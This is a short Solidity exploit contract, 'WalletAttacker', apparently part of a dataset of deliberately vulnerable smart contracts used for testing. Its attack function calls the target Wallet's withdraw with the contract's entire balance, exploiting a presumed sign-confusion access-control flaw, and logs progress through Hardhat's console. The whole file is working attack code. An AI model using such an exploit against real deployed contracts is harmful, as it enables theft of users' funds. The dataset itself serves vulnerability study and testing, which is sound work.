pragma solidity ^0.4.24;

import "../dataset/access_control/wallet_04_confused_sign.sol";
import "hardhat/console.sol";
contract WalletAttacker {
    Wallet public target;

    constructor(Wallet _target) public {
        target = _target;
    }

    function attack() public payable {
        console.log("Attacking...");
        target.withdraw(address(target).balance);
        console.log("After Attacking...");
    }

    function() public payable {}
}
